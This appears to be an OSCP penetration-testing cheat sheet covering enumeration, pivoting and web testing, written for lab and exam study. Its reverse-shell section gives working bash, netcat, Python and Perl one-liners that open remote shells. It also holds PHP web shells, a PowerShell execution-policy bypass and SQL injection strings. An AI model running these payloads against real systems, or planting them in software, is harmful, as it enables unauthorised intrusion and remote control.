# OSCP forum - https://forums.offensive-security.com/ 

# FIND VULN POC's IN THE WILD

>> sometimes vulns and exploits are 1:1 as the lab for example apache + postfix + vulnhub > 
google result shows dedicated write up for this exact match.

## TARGETED NMAP SCAN (nse) 

https://nmap.org/nsedoc/ 
example of script usage:
nmap --script=VULN-TEST-XYZ -p 3366 <targets>
Grab banners manually for more clarity: nc -nv <192.168.x.x> <port>
    
    Quick TCP Scan
nmap -sC -sV -vv -oA quick target 


    Quick UDP Scan
nmap -sU -sV -vv -oA quick_udp target 


    Full TCP Scan
nmap -sC -sV -p- -vv -oA full target


## Web Scanning
    Gobuster quick directory busting
gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

    
    Gobuster search with file extension
gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php


    Nikto web server scan
nikto -h target


    Wordpress scan
wpscan -u target/wp/

  
    Netcat banner grab
nc -v target port
Telnet banner grab
telnet target port

## SMB
    SMB Vulnerability Scan
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06- 025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln- ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse target


    SMB Users & Shares Scan
nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse target


    Enum4linux
enum4linux -a target


    Null connect
rpcclient -U "" target


    Connect to SMB share
smbclient //MOUNT/share


## SNMP

    SNMP enumeration 
snmp-check target


## Reverse Shells 
    Bash shell
bash -i >& /dev/tcp/target/4443 0>&1


    Netcat Linux
nc -e /bin/sh target 4443


    Netcat Windows
nc -e cmd.exe target 4443

    Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_ STREAM);s.connect(("target",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","- i"]);'


    Perl
perl -e 'use Socket;$i="target";$p=4443;socket(S,PF_INET,SOCK_STREAM,getproto byname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN ,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


    Remote Desktop
Remote Desktop for windows with share and 85% screen
rdesktop -u username -p password -g 85% -r disk:share=/root/ target

    PHP
PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?> 
#Alternative
<?php echo shell_exec($_GET["cmd"]);?>


    Powershell
Non-interactive execute powershell file
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File file.ps1


## SSH Tunneling / Pivoting
shuttle
sshuttle -vvr user@target 10.1.1.0/24

    Local port forwarding
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
    
    
    Remote port forwarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
    
    
    Dynamic port forwarding
ssh -D <local proxy port> -p <remote port> <target>
    
    
    Plink local port forwarding
plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>


# WEB

>> see all links for faster enum of site content (linkgopher)

>> robots.txt

>> Check network on page load > any additional files [ look at loaded components and data ] 

>> nmap -A -Pn 192.168.x.x -vv  [ look at ports + services + http methods && special info / configs ] 

>> if software / application open sourcec check git for info disclosure or good references

>> forms input validation testing :

''' (like: 1′ or 1=1 limit 1;#   AND   1′ or 1=1–)
    NULL or null
        Possible error messages returned.
    ‘ , ” , ; , <!
        Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
    – , = , + , ”
        Used to craft SQL Injection queries.
    ‘ , &, ! , ¦ , < , >
        Used to find command execution vulns.
    ../
        Directory Traversal vulns
                                     
  ''' 

>> DNS enum  https://resources.infosecinstitute.com/topic/dns-enumeration-techniques-in-linux/#gref 
https://github.com/darkoperator/dnsrecon 

## DIRS

>> test the name of the domain/sub/ other indicator as dir name 

>> e.g. > target.e231.com/e231  - subname.e231.com/subname  

>> dirb [ use software / app custom list if applicable , else common.txt or big.txt ] 



## Identify software versions
| - | - | 
|:---:|:---:|
| scanner output |
| headers |
| bottom page  |
| mouseoverview may reveal different version on object in web  |
| source code [any identifying libraries used..etc] 
| connect to services attempt [-sC] |


# VIEW FLAG.TXT [USER/ROOT] 
| command | - |
|:---:|:---:|
| cat | 
| cat -A |
| head -filename- |
| less -filename-  |
| tail -f -filename- |
| more -filename- |
| type -filename- |


>> try open file with editors & commands  

| command-tool for linux | - |
|:---:|:---:|
| vi file.txt | https://www.guru99.com/the-vi-editor.html 
| vim file.txt | https://vim.fandom.com/wiki/Tutorial 
| emacs file.txt | https://www.cs.colostate.edu/helpdocs/emacs.html
| nano file.txt  | https://phoenixnap.com/kb/use-nano-text-editor-commands-linux 
| leafpad file.txt | https://manpages.debian.org/stretch/leafpad/leafpad.1.en.html 
| xdg-open file.txt | https://linux.die.net/man/1/xdg-open
| if viewing doesnt work at all - download file to host and open|


| command-tool for windows | - |
|:---:|:---:|
| type file.txt | 
| text file.txt | 




Approved tools https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707
